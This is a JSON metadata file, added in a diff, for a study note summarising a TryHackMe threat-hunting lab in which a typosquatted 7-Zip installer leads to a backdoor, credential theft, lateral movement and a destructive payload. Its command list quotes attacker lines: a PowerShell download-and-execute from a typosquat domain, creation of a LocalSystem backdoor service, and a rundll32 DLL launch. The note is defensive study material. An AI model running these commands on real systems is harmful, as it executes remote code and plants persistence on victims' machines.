@@ -1,0 +1,149 @@
+{
+  "id": "threat hunting labs (siem)/hunt me ii typo squatters (thm)/summary report",
+  "title": "Summary Report",
+  "slug": "summary-report",
+  "relPath": "Threat hunting Labs (SIEM)/Hunt Me II Typo Squatters (THM)/Summary Report.md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-threat-hunting",
+  "curriculumSectionTitle": "Proactive Threat Hunting",
+  "tags": [
+    "SIEM",
+    "PowerShell",
+    "Windows",
+    "Active Directory",
+    "Kerberos",
+    "Memory",
+    "Lateral Movement"
+  ],
+  "mitre": [],
+  "parentId": "threat hunting labs (siem)/hunt me ii typo squatters (thm)",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "threat hunting labs (siem)/hunt me ii typo squatters (thm)"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "threat hunting labs (siem)",
+      "title": "Threat hunting Labs (SIEM)",
+      "slug": "threat-hunting-labs-siem"
+    },
+    {
+      "id": "threat hunting labs (siem)/hunt me ii typo squatters (thm)",
+      "title": "Hunt Me II Typo Squatters (THM)",
+      "slug": "hunt-me-ii-typo-squatters-thm"
+    },
+    {
+      "id": "threat hunting labs (siem)/hunt me ii typo squatters (thm)/summary report",
+      "title": "Summary Report",
+      "slug": "summary-report"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Summary / Report"
+    },
+    {
+      "level": 3,
+      "text": "1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site."
+    },
+    {
+      "level": 3,
+      "text": "2- The user runs the fake 7-Zip installer."
+    },
+    {
+      "level": 3,
+      "text": "3- The MSI stub immediately spawns PowerShell to fetch a hidden payload."
+    },
+    {
+      "level": 3,
+      "text": "4- A legitimate 7-Zip installer is silently deployed to mask the attack."
+    },
+    {
+      "level": 3,
+      "text": "5- A malicious back-door service is created."
+    },
+    {
+      "level": 3,
+      "text": "6- The back-door loads a malicious DLL for code execution."
+    },
+    {
+      "level": 3,
+      "text": "7- Credentials are dumped from memory."
+    },
+    {
+      "level": 3,
+      "text": "8- Active Directory reconnaissance is performed."
+    },
+    {
+      "level": 3,
+      "text": "9- Mimikatz is staged and NT hashes stolen."
+    },
+    {
+      "level": 3,
+      "text": "10- Hashes are used to impersonate high-privilege users."
+    },
+    {
+      "level": 3,
+      "text": "11- Lateral movement via credential reuse."
+    },
+    {
+      "level": 3,
+      "text": "12- Browser-stored credentials are exfiltrated."
+    },
+    {
+      "level": 3,
+      "text": "13- Privilege escalation in Active Directory."
+    },
+    {
+      "level": 3,
+      "text": "14- The final destructive payload is deployed."
+    }
+  ],
+  "overview": "1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.",
+  "study": {
+    "overview": "1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Summary / Report",
+      "1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.",
+      "2- The user runs the fake 7-Zip installer.",
+      "3- The MSI stub immediately spawns PowerShell to fetch a hidden payload.",
+      "4- A legitimate 7-Zip installer is silently deployed to mask the attack.",
+      "5- A malicious back-door service is created.",
+      "6- The back-door loads a malicious DLL for code execution.",
+      "7- Credentials are dumped from memory.",
+      "8- Active Directory reconnaissance is performed.",
+      "9- Mimikatz is staged and NT hashes stolen.",
+      "10- Hashes are used to impersonate high-privilege users.",
+      "11- Lateral movement via credential reuse."
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [
+      {
+        "language": "text",
+        "code": "iex (iwr http://www.7zipp.org/a/7z.ps1 -UseBasicParsing)\n"
+      },
+      {
+        "language": "text",
+        "code": "sc.exe create 7zService binpath=“…\\7zipp.exe” start=auto obj=LocalSystem"
+      },
+      {
+        "language": "text",
+        "code": "rundll32.exe 7zipp.dll,Start"
+      }
+    ],
+    "tools": [
+      "PowerShell"
+    ],
+    "tips": []
+  }
+}
